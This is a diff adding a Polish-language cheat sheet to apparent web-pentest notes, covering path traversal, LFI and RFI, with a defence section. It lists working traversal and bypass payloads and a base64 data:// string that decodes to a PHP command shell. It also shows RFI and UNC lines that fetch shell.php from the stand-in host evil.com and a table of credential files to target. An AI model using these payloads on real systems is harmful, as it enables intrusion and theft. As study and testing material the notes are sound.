@@ -98,6 +98,66 @@ ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/lfi
 
 ---
 
+## CHEATSHEET OWASP — Kluczowe wskazówki
+
+> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md, File_Upload_Cheat_Sheet.md
+
+### Path Traversal — mechanizm ataku
+
+- Atakujacy manipuluje sciezka pliku aby uzyskac dostep do plikow poza zamierzonym katalogiem
+- Podstawowy payload: `../../../etc/passwd` — przechodzenie do katalogu nadrzednego
+- Cel: odczyt plikow konfiguracyjnych, kodow zrodlowych, credentials, kluczy prywatnych
+- W polaczeniu z LFI (Local File Inclusion): mozliwe **zdalne wykonanie kodu** (RCE)
+
+### Techniki bypass filtrow
+
+| Technika | Payload | Opis |
+|----------|---------|------|
+| Podwojne ../  | `....//....//etc/passwd` | Filtr usuwa `../` raz, zostaje `../` |
+| URL encoding | `%2e%2e%2f` | Dekodowanie po walidacji |
+| Double encoding | `%252e%252e%252f` | Podwojne dekodowanie |
+| Null byte | `../../../etc/passwd%00.jpg` | PHP < 5.3.4 obcina po null byte |
+| Backslash (Windows) | `..\..\..\..\windows\win.ini` | Windows path separator |
+| UNC path | `\\evil.com\share\file` | Dostep do zdalnych zasobow |
+| UTF-8 encoding | `..%c0%af..%c0%af` | Overlong UTF-8 encoding |
+
+### Obrona — wielowarstwowa
+
+- **Walidacja wejscia**: allowlist dozwolonych znakow (alfanumeryczne + kropka + myslnik)
+- **Kanonizacja sciezki**: uzyj `realpath()`, `Path.normalize()` PRZED walidacja
+- **Chroot/jail**: ograniczaj dostep do pliku do jednego katalogu
+- **Nie uzywaj danych uzytkownika w sciezkach plikow** — mapuj na ID/hash
+- **Odrzucaj**: `..`, `%2e`, null bytes, backslash, `://` w parametrach sciezki
+- Po kanonizacji sprawdz czy sciezka **zaczyna sie od dozwolonego katalogu bazowego**
+
+### LFI (Local File Inclusion) — dodatkowe wektory
+
+- **PHP wrappers**: `php://filter/convert.base64-encode/resource=index.php` — odczyt kodu zrodlowego
+- **PHP input**: `php://input` z POST body — wykonanie kodu
+- **Data wrapper**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`
+- **Log poisoning**: wstrzyknij kod do log file, potem zaladuj log przez LFI
+- **Session file inclusion**: `/tmp/sess_<session_id>` z wstrzyknietym payloadem
+- **proc/self/environ**: zawiera HTTP headers — wstrzyknij payload w User-Agent
+
+### RFI (Remote File Inclusion)
+
+- `file?path=http://evil.com/shell.php` — zaladuj zdalny plik z kodem
+- Wymaga `allow_url_include=On` w PHP (domyslnie wylaczone)
+- Testuj rowniez z `https://`, `ftp://`, `gopher://`
+
+### Pliki do testowania (cele path traversal)
+
+| System | Plik | Zawartosc |
+|--------|------|-----------|
+| Linux | `/etc/passwd` | Lista uzytkownikow |
+| Linux | `/etc/shadow` | Hashe hasel (wymaga root) |
+| Linux | `/etc/hosts` | Konfiguracja DNS |
+| Linux | `/proc/self/environ` | Zmienne srodowiskowe |
+| Windows | `C:\windows\win.ini` | Konfiguracja Windows |
+| Windows | `C:\windows\system32\config\SAM` | Baza hasel |
+| Aplikacja | `WEB-INF/web.xml` | Konfiguracja Java |
+| Aplikacja | `.env` | Zmienne srodowiskowe aplikacji |
+
 ## ROZSZERZENIA BURP SUITE
 
 | Rozszerzenie | Opis | Link |
